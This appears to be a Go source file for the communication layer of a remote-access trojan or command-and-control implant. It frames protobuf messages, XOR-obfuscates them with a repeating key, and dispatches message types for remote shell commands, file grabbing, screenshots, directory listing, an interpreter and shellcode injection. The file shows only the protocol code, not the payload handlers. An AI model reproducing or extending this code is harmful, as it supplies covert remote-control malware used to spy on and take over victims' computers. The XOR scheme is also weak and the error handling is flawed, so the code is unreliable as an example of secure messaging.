package main

import (
	"encoding/binary"
	"io"
	"log"
	"net"

	"google.golang.org/protobuf/proto"
)

func readMessageBytes(conn net.Conn) ([]byte, error) {
	size_bytes := make([]byte, 8)
	_, err := io.ReadFull(conn, size_bytes)
	if err != nil {
		return size_bytes, err
	}
	log.Println("reading message with ", size_bytes)

	message_lenght := binary.LittleEndian.Uint64(size_bytes)
	log.Println("thats ", message_lenght, " bytes")
	message_bytes := make([]byte, message_lenght)
	_, err = io.ReadFull(conn, message_bytes)
	if err != nil {
		return message_bytes, err
	}
	return message_bytes, nil
}

func sendMessageBytes(conn net.Conn, data []byte) (err error) {
	size_bytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(size_bytes, uint64(len(data)))
	_, err = conn.Write(size_bytes)
	if err != nil {
		return
	}
	_, err = conn.Write(data)
	return
}

func encrypt(data []byte, key []byte) []byte {
	ciphertext := make([]byte, len(data))

	for i := range data {
		ciphertext[i] = data[i] ^ key[i%len(key)]

	}
	return ciphertext
}

func readMessage(conn net.Conn, key []byte) (proto.Message, error) {
	bytes, err := readMessageBytes(conn)
	bytes = encrypt(bytes, key)
	if err != nil {
		return nil, err
	}
	type_byte := bytes[len(bytes)-1]
	bytes = bytes[:len(bytes)-1]
	var message proto.Message
	switch type_byte {
	case 0:
		message = &HeartbeatResponse{}
	case 1:
		message = &ShellCommand{}
	case 2:
		message = &GetFile{}
	case 3:
		message = &TakeScreenshot{}
	case 4:
		message = &GetDirectory{}
	case 5:
		message = &Interpret{}
	case 6:
		message = &InjectShellcode{}
	case 10:
		message = &Ident{}
	case 11:
		message = &ShellResponse{}
	case 12:
		message = &File{}
	case 13:
		message = &Screenshot{}
	case 14:
		message = &GetDirectoryResponse{}
	case 15:
		message = &InterpretResponse{}
	}
	if err := proto.Unmarshal(bytes, message); err != nil {
		return nil, &cantDecodeMessageError{}
	}
	return message, nil

}

func sendMessage(conn net.Conn, message proto.Message, key []byte) error {
	bytes, err := proto.Marshal(message)
	if err != nil {
		return err
	}

	var type_byte byte

	switch message.(type) {
	case *HeartbeatResponse:
		type_byte = 0
	case *ShellCommand:
		type_byte = 1
	case *GetFile:
		type_byte = 2
	case *TakeScreenshot:
		type_byte = 3
	case *GetDirectory:
		type_byte = 4
	case *Interpret:
		type_byte = 5
	case *InjectShellcode:
		type_byte = 6
	case *Ident:
		type_byte = 10
	case *ShellResponse:
		type_byte = 11
	case *File:
		type_byte = 12
	case *Screenshot:
		type_byte = 13
	case *GetDirectoryResponse:
		type_byte = 14
	case *InterpretResponse:
		type_byte = 15
	}

	bytes = append(bytes, type_byte)
	bytes = encrypt(bytes, key)

	return sendMessageBytes(conn, bytes)
}

type cantDecodeMessageError struct{}

func (e *cantDecodeMessageError) Error() string {
	return "cant Decode Message"
}
